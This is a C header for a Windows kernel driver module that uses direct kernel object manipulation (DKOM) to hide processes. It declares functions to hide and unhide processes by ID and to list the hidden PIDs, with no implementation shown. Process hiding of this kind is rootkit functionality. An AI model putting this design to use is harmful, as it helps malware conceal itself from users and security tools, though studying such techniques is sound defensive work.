#pragma once
#include <ntddk.h>
#include "Shared.h"

//
// DKOM process module lifecycle. Invoked from DriverEntry / DriverUnload.
//
NTSTATUS ProcessModuleInitialize(VOID);
VOID ProcessModuleCleanup(VOID);

NTSTATUS ProcessHide(ULONG ProcessId);
NTSTATUS ProcessUnhide(ULONG ProcessId);

//
// Fills Response with the PIDs currently hidden.
//
NTSTATUS ProcessListHidden(PPROCESS_LIST_RESPONSE Response);